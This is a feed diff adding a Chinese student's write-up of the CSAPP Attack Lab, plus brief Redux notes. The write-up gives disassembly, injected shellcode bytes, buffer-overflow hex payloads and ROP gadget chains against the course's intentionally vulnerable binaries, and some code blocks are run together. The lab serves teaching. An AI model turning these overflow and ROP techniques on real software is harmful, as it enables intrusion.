@@ -290,6 +290,282 @@
     </item>
     
     <item>
+      <title>CSAPP_AttackLab</title>
+      <link>https://weivwang.github.io/studynotes/csapp_attacklab/</link>
+      <pubDate>Mon, 15 Nov 2021 14:39:54 +0800</pubDate>
+      
+      <guid>https://weivwang.github.io/studynotes/csapp_attacklab/</guid>
+      <description>&lt;p&gt;CSAPP_Attack&lt;/p&gt;
+&lt;p&gt;要求进行五次攻击。攻击方式是code injection代码注入和Reeturn-oriented programming(ROP)&lt;/p&gt;
+&lt;p&gt;参考资料：&lt;!-- raw HTML omitted --&gt;写的比较好的一个教程&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;h3 id=&#34;前置知识&#34;&gt;前置知识&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Code Injection&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;通过使缓冲区溢出，注入攻击代码。这种情况是没有开启栈随机化（每一次执行，反汇编某个函数，会发现汇编代码的地址是固定的），同时没有开金丝雀防止栈溢出，反汇编也可以看到，没有%fs:40 之类的指令，而在bomblab里面读汇编代码会发现每一个函数都有金丝雀（也解决了当时做那一个实验的疑惑），如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    141f:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
+    1426:       00 00
+    1428:       48 89 44 24 08          mov    %rax,0x8(%rsp)
+    142d:       31 c0                   xor    %eax,%eax
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里的fs是段基址，csapp教材上有讲，但是没细说。看王爽的《汇编语言》讲了这个概念，一般在8086机上会使用段偏移这种寻址方式，大致是：地址线有20位，但是寄存器只有16位，所以采用16bit段地址+4bit偏移量来进行寻址：物理地址 = 段地址*16 + 偏移地址。&lt;/p&gt;
+&lt;p&gt;另一个弄懂的地方是：实际上内存大小是局限于地址总线的宽度的。因为地址总线的宽度代表了寻址的能力，而内存大小超过这个寻址范围，多出去的内存没用了，因为找不到。&lt;/p&gt;
+&lt;p&gt;但是现在的x86-64的寻址能力理论上能达到1800万TB，而实际上目前做不出来这么大的内存，所以现在可以认为内存可以往高了加。&lt;/p&gt;
+&lt;p&gt;扯开了，接着看上面的指令，先将段偏移赋给rax，接着通过rax定位rsp，这其实已经固定好了缓冲区的大小，最后一个xor异或指令意义在于：一旦用户输入数据溢出缓冲区，覆盖了金丝雀数，前后金丝雀数异或结果一定为1，设置某个标志位为1之后程序退出，这样就防止了缓冲区溢出的问题。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;ROP&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;return-oriented programming
+ROP即使用你程序里的字节代码攻击你的程序。&lt;/p&gt;
+&lt;p&gt;就是在开启栈空间随机化之后，每次初始化栈，栈里面放的是allocate函数，分配随机大小空间，实际的调用栈帧在这个随机空间之后，这样就实现了栈空间的随机化，那黑客拿不到这个栈地址，自然无法直接inject程序。&lt;/p&gt;
+&lt;p&gt;但是也有方法：有些黑客用nop指令，nop将rip+4或+8， 不执行操作，这样总有一次能找到目标程序。但是现在随机的空间范围太大了，也不用这种方法了。&lt;/p&gt;
+&lt;p&gt;另一种：用程序里面的代码攻击程序，这样就不用注入代码了，我用你程序本来的代码来当作我的指令，实现攻击。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Objdump&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;GCC&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;GDB&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;这几个也都是bomblab要用的&lt;/p&gt;
+&lt;h3 id=&#34;实验材料&#34;&gt;实验材料&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/17/KhJyFQzwINZgpe3.png&#34; alt=&#34;image-20211117171611619&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;cookie：存放通过关卡需要的字符串&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Ctarget：使用code injection方式进行攻击的程序&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Farm.c：感觉没什么用，已经被编译进rtarget里面了&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Hex2raw ：16进制转字符串&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Readme：学号等信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;rtarget：使用ROP方式进行攻击&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/17/dt9kUxI4rBf5TqM.png&#34; alt=&#34;image-20211117173053423&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/17/fs2FWva8PDBYwjg.png&#34; alt=&#34;image-20211117173106212&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Gets()是不安全的，没有限制读入的长度，容易导致缓冲区溢出&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/17/wbhmruZO4e6F5Nf.png&#34; alt=&#34;image-20211117173229239&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;touch1&#34;&gt;touch1&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;gdb ctarget
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;disas getbuf
+#输出：
+Dump of assembler code for function getbuf:
+   0x0000000000401796 &amp;lt;+0&amp;gt;:	sub    $0x38,%rsp
+   0x000000000040179a &amp;lt;+4&amp;gt;:	mov    %rsp,%rdi
+   0x000000000040179d &amp;lt;+7&amp;gt;:	callq  0x401a36 &amp;lt;Gets&amp;gt;
+   0x00000000004017a2 &amp;lt;+12&amp;gt;:	mov    $0x1,%eax
+   0x00000000004017a7 &amp;lt;+17&amp;gt;:	add    $0x38,%rsp
+   0x00000000004017ab &amp;lt;+21&amp;gt;:	retq   
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;disas touch1
+#输出：
+	 0x00000000004017ac &amp;lt;+0&amp;gt;:	sub    $0x8,%rsp
+   0x00000000004017b0 &amp;lt;+4&amp;gt;:	movl   $0x1,0x202d42(%rip)        # 0x6044fc &amp;lt;vlevel&amp;gt;
+   0x00000000004017ba &amp;lt;+14&amp;gt;:	lea    0x1968(%rip),%rdi        # 0x403129
+   0x00000000004017c1 &amp;lt;+21&amp;gt;:	callq  0x400c70 &amp;lt;puts@plt&amp;gt;
+   0x00000000004017c6 &amp;lt;+26&amp;gt;:	mov    $0x1,%edi
+   0x00000000004017cb &amp;lt;+31&amp;gt;:	callq  0x401ca6 &amp;lt;validate&amp;gt;
+   0x00000000004017d0 &amp;lt;+36&amp;gt;:	mov    $0x0,%edi
+   0x00000000004017d5 &amp;lt;+41&amp;gt;:	callq  0x400de0 &amp;lt;exit@plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;getbuf是不安全的，它建立0x38大小的缓冲区，希望读入0x38的数据，但是我们一旦输入的数据超过0x38，会将getbuf的返回地址覆盖。&lt;/p&gt;
+&lt;p&gt;所以思路是，写满缓冲区，并将溢出部分（原本的返回地址）设置为touch1的地址，这样getbuf将直接返回到touch1&lt;/p&gt;
+&lt;p&gt;touch1地址为0x00000000004017ac&lt;/p&gt;
+&lt;p&gt;所以只需要将getbuf()函数返回地址修改为0x00000000004017ac，利用缓冲区溢出的原理&lt;/p&gt;
+&lt;p&gt;新建输入文件level1.txt：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;vim level1.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;填充内容：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 #填满缓冲区
+ac 17 40 00 00 00 00 00 #返回地址改为touch1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意，大部分机器采用小端法，数是反过来的&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./hex2raw -i level1.txt | ./ctarget -q
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;顺利通过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Cookie: 0x5fc1af14
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+	user id	2019302110426
+	course	15213-f15
+	lab	attacklab
+	result	251:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AC 17 40 00 00 00 00 00 
+
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;touch2&#34;&gt;touch2&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;disas touch2
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;	 0x00000000004017da &amp;lt;+0&amp;gt;:	sub    $0x8,%rsp
+   0x00000000004017de &amp;lt;+4&amp;gt;:	mov    %edi,%edx
+   0x00000000004017e0 &amp;lt;+6&amp;gt;:	movl   $0x2,0x202d12(%rip)        # 0x6044fc &amp;lt;vlevel&amp;gt;
+   0x00000000004017ea &amp;lt;+16&amp;gt;:	cmp    %edi,0x202d14(%rip)        # 0x604504 &amp;lt;cookie&amp;gt;
+   0x00000000004017f0 &amp;lt;+22&amp;gt;:	je     0x40181c &amp;lt;touch2+66&amp;gt;
+   0x00000000004017f2 &amp;lt;+24&amp;gt;:	lea    0x197f(%rip),%rsi        # 0x403178
+   0x00000000004017f9 &amp;lt;+31&amp;gt;:	mov    $0x1,%edi
+   0x00000000004017fe &amp;lt;+36&amp;gt;:	mov    $0x0,%eax
+   0x0000000000401803 &amp;lt;+41&amp;gt;:	callq  0x400d90 &amp;lt;__printf_chk@plt&amp;gt;
+   0x0000000000401808 &amp;lt;+46&amp;gt;:	mov    $0x2,%edi
+   0x000000000040180d &amp;lt;+51&amp;gt;:	callq  0x401d76 &amp;lt;fail&amp;gt;
+   0x0000000000401812 &amp;lt;+56&amp;gt;:	mov    $0x0,%edi
+   0x0000000000401817 &amp;lt;+61&amp;gt;:	callq  0x400de0 &amp;lt;exit@plt&amp;gt;
+   0x000000000040181c &amp;lt;+66&amp;gt;:	lea    0x192d(%rip),%rsi        # 0x403150
+   0x0000000000401823 &amp;lt;+73&amp;gt;:	mov    $0x1,%edi
+   0x0000000000401828 &amp;lt;+78&amp;gt;:	mov    $0x0,%eax
+   0x000000000040182d &amp;lt;+83&amp;gt;:	callq  0x400d90 &amp;lt;__printf_chk@plt&amp;gt;
+   0x0000000000401832 &amp;lt;+88&amp;gt;:	mov    $0x2,%edi
+   0x0000000000401837 &amp;lt;+93&amp;gt;:	callq  0x401ca6 &amp;lt;validate&amp;gt;
+   0x000000000040183c &amp;lt;+98&amp;gt;:	jmp    0x401812 &amp;lt;touch2+56&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;相比于touch1，touch2带参数，在touch2内部将参数与cookie值进行比较，若相等才能过关&lt;/p&gt;
+&lt;p&gt;地址为：0x00000000004017da&lt;/p&gt;
+&lt;p&gt;不能使用jmp或者call指令，所以将touch2地址压入栈，使用ret指令将touch2地址弹出，并设置为指令寄存器的值，因为touch2将输入的参数与cookie比较，所以把cookie值赋给第一个参数rdi&lt;/p&gt;
+&lt;p&gt;注入代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;vim inject.s
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;movq $0x5fc1af14, %rdi #将cookie赋给rdi寄存器，rdi存放函数第一个参数pushq $0x00000000004017da #压入touch2地址ret #弹出touch2地址，赋给rsi，这两步是为了跳转到touch2
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;生成为.o文件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gcc -c inject.s
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看.o文件，从而获得可执行的指令序列&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;objdump -d inject.o
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Disassembly of section .text:
+
+0000000000000000 &amp;lt;.text&amp;gt;:
+   0:	48 c7 c7 14 af c1 5f 	mov    $0x5fc1af14,%rdi
+   7:	68 da 17 40 00  	pushq  $0x4017da
+   e:	c3 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以这三条指令序列：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;48 c7 c7 14 af c1 5f ff 34 25 da 17 40 00 c3 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;寻找getbuf的rsp地址，实现覆盖&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;gdb ctargetbreak getbufrun -qdisas
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;disas输出：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(gdb) disas
+Dump of assembler code for function getbuf:
+=&amp;gt; 0x0000000000401796 &amp;lt;+0&amp;gt;:	sub    $0x38,%rsp
+   0x000000000040179a &amp;lt;+4&amp;gt;:	mov    %rsp,%rdi
+   0x000000000040179d &amp;lt;+7&amp;gt;:	callq  0x401a36 &amp;lt;Gets&amp;gt;
+   0x00000000004017a2 &amp;lt;+12&amp;gt;:	mov    $0x1,%eax
+   0x00000000004017a7 &amp;lt;+17&amp;gt;:	add    $0x38,%rsp
+   0x00000000004017ab &amp;lt;+21&amp;gt;:	retq   
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;stepi
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看rsp值&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;p/x $rsp
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;$1 = 0x55660a78 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;touch2地址：0x55660a78&lt;/p&gt;
+&lt;p&gt;getbuf和第一关大小一样，都是0x38&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;vim level2.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;48 c7 c7 14 af c1 5f 68 
+da 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 0a 66 55 00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;./hex2raw -i level2.txt | ./ctarget -q
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;./hex2raw -i level5.txt | ./rtarget -q&lt;/p&gt;
+&lt;p&gt;0x55660ab0&lt;/p&gt;
+&lt;p&gt;0x55660a78&lt;/p&gt;
+&lt;h3 id=&#34;touch3&#34;&gt;touch3&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/17/Hdx8wkiRSQFCEZp.png&#34; alt=&#34;image-20211117174559398&#34;&gt;&lt;/p&gt;
+&lt;p&gt;![image-20211117174622704](/Users/wangweiwei/Library/Application Support/typora-user-images/image-20211117174622704.png)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;disas touch3
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;   0x00000000004018f1 &amp;lt;+0&amp;gt;:	push   %rbx   0x00000000004018f2 &amp;lt;+1&amp;gt;:	mov    %rdi,%rbx   0x00000000004018f5 &amp;lt;+4&amp;gt;:	movl   $0x3,0x202bfd(%rip)        # 0x6044fc &amp;lt;vlevel&amp;gt;   0x00000000004018ff &amp;lt;+14&amp;gt;:	mov    %rdi,%rsi   0x0000000000401902 &amp;lt;+17&amp;gt;:	mov    0x202bfc(%rip),%edi        # 0x604504 &amp;lt;cookie&amp;gt;   0x0000000000401908 &amp;lt;+23&amp;gt;:	callq  0x40183e &amp;lt;hexmatch&amp;gt;   0x000000000040190d &amp;lt;+28&amp;gt;:	test   %eax,%eax   0x000000000040190f &amp;lt;+30&amp;gt;:	je     0x40193e &amp;lt;touch3+77&amp;gt;   0x0000000000401911 &amp;lt;+32&amp;gt;:	mov    %rbx,%rdx   0x0000000000401914 &amp;lt;+35&amp;gt;:	lea    0x1885(%rip),%rsi        # 0x4031a0   0x000000000040191b &amp;lt;+42&amp;gt;:	mov    $0x1,%edi   0x0000000000401920 &amp;lt;+47&amp;gt;:	mov    $0x0,%eax   0x0000000000401925 &amp;lt;+52&amp;gt;:	callq  0x400d90 &amp;lt;__printf_chk@plt&amp;gt;   0x000000000040192a &amp;lt;+57&amp;gt;:	mov    $0x3,%edi   0x000000000040192f &amp;lt;+62&amp;gt;:	callq  0x401ca6 &amp;lt;validate&amp;gt;   0x0000000000401934 &amp;lt;+67&amp;gt;:	mov    $0x0,%edi   0x0000000000401939 &amp;lt;+72&amp;gt;:	callq  0x400de0 &amp;lt;exit@plt&amp;gt;   0x000000000040193e &amp;lt;+77&amp;gt;:	mov    %rbx,%rdx   0x0000000000401941 &amp;lt;+80&amp;gt;:	lea    0x1880(%rip),%rsi        # 0x4031c8   0x0000000000401948 &amp;lt;+87&amp;gt;:	mov    $0x1,%edi
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt; 0x00000000004018f1 &amp;lt;+0&amp;gt;:	push   %rbx
+   0x00000000004018f2 &amp;lt;+1&amp;gt;:	mov    %rdi,%rbx
+   0x00000000004018f5 &amp;lt;+4&amp;gt;:	movl   $0x3,0x202bfd(%rip)        # 0x6044fc &amp;lt;vlevel&amp;gt;
+   0x00000000004018ff &amp;lt;+14&amp;gt;:	mov    %rdi,%rsi
+   0x0000000000401902 &amp;lt;+17&amp;gt;:	mov    0x202bfc(%rip),%edi        # 0x604504 &amp;lt;cookie&amp;gt;
+   0x0000000000401908 &amp;lt;+23&amp;gt;:	callq  0x40183e &amp;lt;hexmatch&amp;gt;
+   0x000000000040190d &amp;lt;+28&amp;gt;:	test   %eax,%eax
+   0x000000000040190f &amp;lt;+30&amp;gt;:	je     0x40193e &amp;lt;touch3+77&amp;gt;
+   0x0000000000401911 &amp;lt;+32&amp;gt;:	mov    %rbx,%rdx
+   0x0000000000401914 &amp;lt;+35&amp;gt;:	lea    0x1885(%rip),%rsi        # 0x4031a0
+   0x000000000040191b &amp;lt;+42&amp;gt;:	mov    $0x1,%edi
+   0x0000000000401920 &amp;lt;+47&amp;gt;:	mov    $0x0,%eax
+   0x0000000000401925 &amp;lt;+52&amp;gt;:	callq  0x400d90 &amp;lt;__printf_chk@plt&amp;gt;
+   0x000000000040192a &amp;lt;+57&amp;gt;:	mov    $0x3,%edi
+   0x000000000040192f &amp;lt;+62&amp;gt;:	callq  0x401ca6 &amp;lt;validate&amp;gt;
+   0x0000000000401934 &amp;lt;+67&amp;gt;:	mov    $0x0,%edi
+   0x0000000000401939 &amp;lt;+72&amp;gt;:	callq  0x400de0 &amp;lt;exit@plt&amp;gt;
+   0x000000000040193e &amp;lt;+77&amp;gt;:	mov    %rbx,%rdx
+   0x0000000000401941 &amp;lt;+80&amp;gt;:	lea    0x1880(%rip),%rsi        # 0x4031c8
+   0x0000000000401948 &amp;lt;+87&amp;gt;:	mov    $0x1,%edi
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class=&#34;language-undefined&#34; data-lang=&#34;undefined&#34;&gt;./hex2raw -i level3.txt | ./ctarget -q
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;48 c7 c7 b8 0a 66 55 68 
+f1 18 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 0a 66 55 00 00 00 00
+35 66 63 31 61 66 31 34
+00
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Mov cookie地址 rdi&lt;/p&gt;
+&lt;p&gt;pop touch3&lt;/p&gt;
+&lt;p&gt;ret&lt;/p&gt;
+&lt;p&gt;关于cookie字符数组存放的位置：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/17/rZH1G8gwYXABLCk.png&#34; alt=&#34;image-20211117174844978&#34;&gt;&lt;/p&gt;
+&lt;p&gt;cookie需要以0结尾：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/17/buo9BYfIeRyDExd.png&#34; alt=&#34;image-20211117174941581&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rop-touch2&#34;&gt;ROP touch2&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;开启了栈随机化,栈的位置在程序每次运行时都有变化，难以预测攻击字符串的位置（空操作雪橇&lt;code&gt;nop sled&lt;/code&gt;可暴力枚举,太庞大）&lt;/li&gt;
+&lt;li&gt;栈空间不允许有可执行指令，限制了可执行代码区域&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;Mov4019c5:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)4019c5 + 2 = 4019c7Pop401994:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax401994 + 2 = 401996
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+96 02 00 00 00 00 00 00 # pop rax , 将返回地址变为getgad1
+14 af c1 5f 00 00 00 00 # cookie值，其实是执行 set rax = cookie
+37 00 00 00 00 00 00 00 # mov rax rdi
+da 17 40 00 00 00 00 00&lt;/p&gt;
+&lt;h3 id=&#34;rop-touch3&#34;&gt;ROP touch3&lt;/h3&gt;
+&lt;p&gt;mov    %rsp,%rax&lt;/p&gt;
+&lt;p&gt;401a00:	8d 87 48 89 e0 94    	lea    -0x6b1f76b8(%rdi),%eax&lt;/p&gt;
+&lt;p&gt;401a00 + 2 = 401a02&lt;/p&gt;
+&lt;p&gt;add    $0x20,%rax&lt;/p&gt;
+&lt;p&gt;4019d2:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax&lt;/p&gt;
+&lt;p&gt;4019d2 + 2 = 4019d4&lt;/p&gt;
+&lt;p&gt;48 89 c7 :&lt;/p&gt;
+&lt;p&gt;4019a2:	8d 87 48 89 c7 92    	lea    -0x6d3876b8(%rdi),%eax&lt;/p&gt;
+&lt;p&gt;4019a2 + 2 = 4019a4&lt;/p&gt;
+&lt;p&gt;0x00000000004018f1&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0:	48 89 e0             	  mov    %rsp,%rax   3:	04 37               	add    $0x37,%rax   5:	48 89 c7             	mov    %rax,%rdi
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0084 1a 40 00 00 00 00 00 #gadget1d4 19 40 00 00 00 00 00 #gadvget29e 19 40 00 00 00 00 00 #gadget3f1 18 40 00 00 00 00 00 #touch300 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 0035 66 63 31 61 66 31 3400
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;movq %rsp,%rax  : 48 89 e0&lt;/p&gt;
+&lt;p&gt;add $0x20,%al #$常数为偏移量，暂时未定 : 04 xx&lt;/p&gt;
+&lt;p&gt;movq %rax,%rdi&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/15/1pcX5D9JeAtTLUy.png&#34; alt=&#34;image-20211115110336875&#34;&gt;&lt;/p&gt;
+&lt;p&gt;401a84 是gedget1，让rsp = rax&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/15/v19IO5bNXEJnTDW.png&#34; alt=&#34;image-20211115110905570&#34;&gt;&lt;/p&gt;
+&lt;p&gt;40 19 d4&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/15/YKIa62Pd5gSWfrN.png&#34; alt=&#34;image-20211115111041884&#34;&gt;&lt;/p&gt;
+&lt;p&gt;40 19 9e&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;./hex2raw -i level5.txt | ./rtarget -q
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;让我心累的点新的发现&#34;&gt;让我心累的点&amp;amp;新的发现&lt;/h3&gt;
+&lt;p&gt;我采用网上教程，过touch2和touch3的时候，方法绝对没错，但是永远过不了。和同学讨论过后，确认我的步骤绝对没错，我开始怀疑给的程序是有bug的。&lt;/p&gt;
+&lt;p&gt;于是在IDA上反汇编动态调试（和室友一起），我的docker端口映射有问题，没办法动态调试。发现：当GET()到我的touch2地址时，由于我倒霉，地址里面有0a，读到这一位之后不读了，看get的代码，发现程序读到10（0x0a）时，果然会break。其实想一想也能理解，因为0a是换行符啊！！！&lt;/p&gt;
+&lt;p&gt;所以我修改了程序的源代码，0a的时候不break，果然本地通过，&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/23/PRqgUvxEkfVHGpr.png&#34; alt=&#34;image-20211123153846353&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但是课程网站上是invalid，果然，网站为了防止我们作弊（修改原代码过程序/直接伪造请求），不能允许我们这样做。&lt;/p&gt;
+&lt;p&gt;那咋办了，只能让地址里面不包含0a了，于是打算使用数据将0axx的栈空间全部占满，直接把指令存在test函数的栈帧中：除了写的0特别多，看到👀疼，终于过了。。。&lt;/p&gt;
+&lt;p&gt;同样的方法过了touch3&lt;/p&gt;
+&lt;p&gt;答案是这样的：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/23/GiXE9PFzsmeBCwO.png&#34; alt=&#34;image-20211123154424623&#34;&gt;&lt;/p&gt;
+&lt;p&gt;为了造出这个地址，补了非常多0&lt;/p&gt;
+&lt;p&gt;实际上进了test栈帧&lt;/p&gt;
+&lt;p&gt;那一天本来晚上6点去验收，自己预估10分钟就能弄完，也没吃饭，想着验收完了美美吃一顿，结果因为这个问题一直弄到晚上10:30，最后解决了吃了碗泡面。。。。&lt;/p&gt;
+&lt;p&gt;关键是别的同学都没这个问题，我正好随到这个地址，当时觉得自己特别倒霉，现在想想其实还好。&lt;/p&gt;
+&lt;p&gt;开辟出了一种新的方法，也对这个攻击的了解更加深刻了。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
       <title>React再思考</title>
       <link>https://weivwang.github.io/studynotes/react%E5%86%8D%E6%80%9D%E8%80%83/</link>
       <pubDate>Sat, 06 Nov 2021 19:38:03 +0800</pubDate>
@@ -557,7 +833,34 @@
 &lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/19/cFoTbreuEh1Cq9V.png&#34; alt=&#34;image-20211119113223593&#34;&gt;&lt;/p&gt;
 &lt;p&gt;getDrivedStateFromProps(): 根据props生成state&lt;/p&gt;
 &lt;p&gt;官网不推荐使用，容易写出bug&lt;/p&gt;
-&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;
+&lt;h3 id=&#34;redux&#34;&gt;Redux&lt;/h3&gt;
+&lt;p&gt;Flux: Redux鼻祖&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.loli.net/2021/11/20/qTEJ4eQn6rGcFS8.png&#34; alt=&#34;image-20211120191207422&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;View:视图层&lt;/li&gt;
+&lt;li&gt;ActionCreator ：视图层发出的消息&lt;/li&gt;
+&lt;li&gt;Dispatcher: 用来接受Action，执行回调函数&lt;/li&gt;
+&lt;li&gt;Store(数据层)：用来存放应用的状态，一旦发生变动，提醒Views更新界面&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;但是Flux实现太复杂&lt;/p&gt;
+&lt;h4 id=&#34;需要redux的项目&#34;&gt;需要Redux的项目&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;用户使用的方式复杂&lt;/li&gt;
+&lt;li&gt;不同身份用户有不同的使用方式&lt;/li&gt;
+&lt;li&gt;多个用户之间可以协作&lt;/li&gt;
+&lt;li&gt;与服务端大量交互，或者使用了websocket&lt;/li&gt;
+&lt;li&gt;View需要从多个来源获取数据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;从组件层面考虑：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;某个组件的状态需要共享&lt;/li&gt;
+&lt;li&gt;某个状态在任何地方都可拿到&lt;/li&gt;
+&lt;li&gt;一个组件需要改变全局状态&lt;/li&gt;
+&lt;li&gt;一个组件需要改变另一个组件的状态&lt;/li&gt;
